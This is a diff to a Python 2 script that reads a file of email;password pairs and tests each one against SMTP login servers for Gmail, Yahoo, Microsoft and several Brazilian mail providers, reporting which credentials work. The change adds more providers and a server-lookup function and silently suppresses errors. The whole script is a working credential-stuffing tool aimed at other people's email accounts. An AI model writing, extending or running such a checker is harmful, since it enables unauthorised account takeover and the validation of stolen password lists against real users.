@@ -14,7 +14,12 @@
 
 import sys
 import smtplib
-smtp_servers = ['smtp.gmail.com:587','smtp.mail.yahoo.com:587','smtp.live.com:587']
+smtp_servers = [('gmail','smtp.gmail.com:587'),('yahoo','smtp.mail.yahoo.com:587'),('live','smtp.live.com:587'),('hotmail','smtp.live.com:587'),('outlook','smtp.live.com:587'),('uol','smtps.uol.com.br:587'),('bol','smtps.bol.com.br:587'),('globo','smtp.globo.com:465'),('ig','smtp.ig.com.br:465'),('terra','smtp.terra.com.br:587'),('ibest','smtp.ibest.com.br:465'),('itelefonica','smtp.itelefonica.com.br:25')]
+
+def findSmtpServer(smtp_servers,mail):
+	for s in smtp_servers:
+		if s[0] in mail[mail.find('@'):]:
+			return s[1]
 
 def login(s,mail,passwd):
 	s.starttls()
@@ -23,29 +28,26 @@ def login(s,mail,passwd):
 		s.login(mail,passwd)
 	except smtplib.SMTPAuthenticationError as e:
 		if e[0] == 534:
-			sys.stdout.write('\r[+] Login: %s ; Passwd: %s  [OK] ! 											\n'%(mail,passwd))
+			sys.stdout.write('\r[+] Login: %s | Passwd: %s  [OK] ! 											\n'%(mail,passwd))
 		elif e[0] == 535:
-			sys.stdout.write('\r[-] Erro : Mail[%s] and Password[%s] not accepted !'%(mail,passwd))
+			sys.stdout.write('\r[-] Erro : Mail [ %s ] and Password [ %s ] not accepted !'%(mail,passwd))
 		else:
-			sys.stdout.write('\r[-]Undetermined Error ! 											')
+			sys.stdout.write('\r[-] Undetermined Error ! 											')
 
 	s.quit()
 
-for l in open(sys.argv[1]):
-	dataLogin = l.replace('\n','').split(';')  
-	mail   = dataLogin[0] 
-	passwd = dataLogin[1]
-	if ("@gmail." in mail):
-		s = smtplib.SMTP(smtp_servers[0])
-		login(s,mail,passwd)
-	elif ("@yahoo." in mail):
-		s = smtplib.SMTP(smtp_servers[1])
-		login(s,mail,passwd)
-	elif ("@hotmail." in mail) or ("@live." in mail) or ("@outlook." in mail):
-		s = smtplib.SMTP(smtp_servers[2])	
-		login(s,mail,passwd)
+if __name__ == '__main__':
+	if len(sys.argv) < 2:
+		print '[!] Usage: %s listfile'%sys.argv[0]
 	else:
-		sys.stdout.write('\rUnlisted mail server [%s] ! 											'%mail)
-		pass
-	
-sys.stdout.write('\n[_] End Of Process !')
+		for l in open(sys.argv[1]):
+			dataLogin = l.replace('\n','').split(';')  
+			mail   = dataLogin[0].strip('\n') 
+			passwd = dataLogin[1].strip('\n')
+			try:
+				s = smtplib.SMTP(findSmtpServer(smtp_servers,mail))
+				login(s,mail,passwd)
+			except Exception as e:
+				pass
+
+		sys.stdout.write('\n[_] End Of Process !')
